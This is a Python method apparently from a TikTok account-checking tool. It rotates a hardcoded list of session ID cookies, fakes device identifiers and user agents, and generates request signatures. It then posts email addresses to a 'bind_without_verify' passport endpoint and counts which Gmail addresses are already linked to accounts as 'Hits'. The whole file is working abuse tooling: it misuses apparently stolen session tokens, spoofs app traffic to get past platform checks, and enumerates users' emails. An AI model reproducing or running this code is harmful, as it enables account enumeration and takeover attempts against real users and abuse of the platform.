    def API_CH(self , email ):
        cookies ={
            "passport_csrf_token": self.secret,
            "passport_csrf_token_default": self.secret,
            "sessionid":random.choice([
                'a16fa6c5be204caeef3e2db9abf7e54a',
'4c555f3897daeeaec5d33075aac6e7a5',
'9ef5dd91a967ac5eb3deaa8e78adf7d4',
'd08e27df2c75af9276fc4b0f60d72d19',
'df395f8ac47b3db8e9a8f899ac5937d3',
'46a8ef281a146aa734c5527148003fe5',
'7001dc2643f83cf6e72def00fbccfc6f',
'5081bf0f8e54a1dd28629a50ae0b0e01',
'3100e89c7b0d70e8a0f41233b28a769c',
'8d7571beb5a4285e6bccfa4cc6a4d502',
'd670e72823c751079017ca9a3b21020c',
'fd61effb1d65a1b01c820361d8228c7c',
'b6acb99c05b13b9ff866c26ee64a8fa8',
'4f761f08a724692c9ecb5e7fc54cbea3',
'2747f4c3d1f3b922f7b86dcd546af8d7',
'cd4489ef3fe23ddc68ad4454c9cabc41',
'5a0d6b2ca82d8824852148c22e146910',
'2ad32b398e15e80e443f922ab4928447',
'5a4a4c8c746d55a3cae7f32a127513aa',
'f4ea0fc94454b6a47fafb09a00aeb0e8',
'6bf28abdc354288b73bf99008f6a361f',
'df7246019b382003c7d438e2eec3f812',
'f4fd0301c875e5a5da06c14fd136934c',
'20f03a3785cbab1d1f242c50a8b2ef21',
'93bf67de66b6ddff3a75c3aec78e7276',
'0428ad14102a079e02df973ef9c3ca34',
'a7a6042fd8bb7aa59496346d9646e46f',
'525d663adcec79b1601cdfa2125627dc',
'8100a904b508f86fa19c3b3a2146a979',
'd972be2b916d7cb7a3e2c534dac73439',
'30c2b94bf3ddd98952a6f28137250375',
'fd4cd15633d1ebceccc492d509a9522b',
'648c1df7cef3ed3bd814c932939ce846',
'0f2d6256d2252a5cecd575b76009e8c2',
'bb4cef9ef619cb46f0a45c308c0d1e25',
'278b94bbb57a92ff23d92c5c52e1d57e',
'59317ae149b292fa766df9b805d4012e',
'40035d852d85c40b180d5154dce74e32',
'572670e81c97c6b16e081ee0243883b5',
'8a53b9f0b2ad46141f3ef206170ea95f',
'e54ae478d3928c1980661d3dcc81127e',
'cec657d01305d24d62ead1ebca1ea0de',
'1aa7da779bfb34e9adcda9d330242347',
'0727771a119768c35ddad138ae669ccb',
'b394eaa0f2376832f1e65701406872b4',
'1fc1c3d992d806afbb88fb05b3f8b51b',
'56e02966f4761a361a575db0a32ba2f7',
'978573dbd8fb062130305da932016754',
'466efa18c526a080549b97f03305a3a9',
'1f7b16535d0c8f91d1b0f0d4291726c7',
'c5a5d59db6c74831c598bbacee8ad25a',
'2b052a3a01222be0da70fd2849f6f849',
'18c9b9a235c938b34c1f8c5af3c65eb3',
'847ce0bac8342d7e63798419c0958268',
'08d0463c3ea0a3c7ef8f6a8e2e341528',
'138b138be22630bb46a0dd4d747dc037',
'6f8fd20e4cfb6af8d68e38284f732269',
'266d4adf7a9741e20386d77215fe1e1c',
'f76100b0c36e12ceec7dfedebb50f967',

            ])
            }
        self.ses.cookies.update(cookies)
        device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
        device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
        regions = ["AE", "IQ", "US", "FR", "DE"]
        languages = ["en"]
        paramss = {
        'passport-sdk-version': "6030790",
        'iid': str(random.randint(1, 10**19)),
        'device_id': str(random.randint(1, 10**19)),
        'ac': "WIFI",
        'channel': "googleplay",
        'aid': "1233",
        'app_name': "musical_ly",
        'version_code': "360505",
        'version_name': "36.5.5",
        'device_platform': "android",
        'os': "android",
        'ab_version': "36.5.5",
        'ssmix': "a",
        'device_type': random.choice(device_types),
        'device_brand': random.choice(device_brands),
        'language': random.choice(languages),
        'os_api': str(random.randint(28, 34)),
        'os_version': str(random.randint(10, 14)),
        'openudid': str(binascii.hexlify(urandom(8)).decode()),
        'manifest_version_code': "2023605050",
        'resolution': "1440*2969",
        'dpi': str(random.choice([420, 480, 532])),
        'update_version_code': "2023605050",
        '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        'is_pad': "0",
        'app_type': "normal",
        'sys_region': random.choice(regions),
        'last_install_time': str(random.randint(1600000000, 1700000000)),
        'mcc_mnc': "41820",
        'timezone_name': "Asia/Baghdad",
        'carrier_region_v2': "418",
        'app_language': random.choice(languages),
        'carrier_region': random.choice(regions),
        'ac2': "wifi",
        'uoo': "0",
        'op_region': random.choice(regions),
        'timezone_offset': str(random.randint(0, 14400)),
        'build_number': "36.5.5",
        'host_abi': "arm64-v8a",
        'locale': random.choice(languages),
        'region': random.choice(regions),
        'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        'cdid': str(uuid.uuid4()),
        'support_webview': "1",
        'reg_store_region': random.choice(regions).lower(),
        'user_selected_region': "0",
        'cront_version': "1c651b66_2024-08-30",
        'ttnet_version': "4.2.195.8-tiktok",
        'use_store_region_cookie': "1",
        'ab_version':'37.8.5'
        }
        
        params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",    'cdid': str(uuid.uuid4()),'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),    'iid': str(random.randint(1, 10**19)),    'device_id': str(random.randint(1, 10**19)),    'openudid': str(binascii.hexlify(urandom(8)).decode())}
        _rticket = params["_rticket"]
        device_id = params["device_id"]
        iid = params["iid"]
        cdid = params["cdid"]
        openudid = params["openudid"]
        _rticket = params["_rticket"]
        ts = params["ts"]
        params={'_rticket':_rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
        device_type = params["device_type"]
        app_name = "com.zhiliaoapp.musically"
        app_version = f"{random.randint(2000000000, 3000000000)}"
        platform = "Linux"
        os = f"Android {random.randint(10, 15)}"
        locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
        locale = random.choice(locales)
        device_types = ["phone", "tablet", "tv"]
        device_type = random.choice(device_types)
        build = f"UP1A.{random.randint(200000000, 300000000)}"
        cronet_version = f"{random.randint(10000000, 20000000)}"
        cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        quic_version = f"{random.randint(10000000, 20000000)}"
        quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        user_agent = (f"{app_name}/{app_version} ({platform}; U; {os}; {locale}; {device_type}; "
                    f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                    f"QuicVersion:{quic_version} {quic_date})")

        m=self. signn(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        headers = {
        'User-Agent': user_agent,
        'x-tt-passport-csrf-token': self. secret,
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-argus': m["x-argus"],
        'x-gorgon': m["x-gorgon"],
        'x-khronos': m["x-khronos"],
        'x-ladon': m["x-ladon"]
        }
        try:
            url="https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
            #url='https://api31-normal-useast1a.tiktokv.com/passport/email/bind'
            res = requests. post(url, params=params, headers=headers,data={"email":email},cookies=cookies).text
            #  print (res)

            if 'Email is linked to another account. Unlink or try another email.'in res:
                if "@gmail.com"in email:
                    self. check_email(email)          
                    self.gt+=1
                    sys.stdout.write(f"\r[Dev: Ethan] Hits : {M}{self.ge} | False: {M}{self.bt} | No: {M}{self.be}")
                    sys.stdout.flush()      

            else:
                if "@gmail.com"in email:          
                    self.bt+=1
                    sys.stdout.write(f"\r[Dev: Ethan] Hits : {M}{self.ge} | False: {M}{self.bt} | No: {M}{self.be}")
                    sys.stdout.flush()         
        except:
            pass
